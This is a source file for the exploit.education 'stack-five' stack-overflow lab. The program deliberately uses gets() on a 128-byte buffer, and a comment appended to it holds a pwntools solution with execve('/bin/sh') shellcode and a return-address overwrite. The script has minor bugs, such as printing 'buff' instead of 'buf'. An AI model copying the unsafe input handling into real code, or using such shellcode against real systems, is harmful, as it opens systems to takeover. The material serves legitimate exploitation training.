/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to stack five, brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

/**
***** 1. Find rip offset *****
from pwn import *

io = process('./stack-five')

io.recvuntil(b"\n")
io.sendline(cyclic(500))
io.wait()

core = io.corefile

stack = core.rsp
pattern = core.read(stack, 4)
rip_offset = cyclic_find(pattern)
print("rip offset is %d", rip_offset)

***** 2. payload and exploit *****
buf = "\x90" * 20
buf +="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf += "\x90"* (rip_offset - len(buf)) + "\x7f\xff\xff\xff\xde\xc0"[::-1]
print buff

Command: python2 exploit.py - | ./stack-five


*/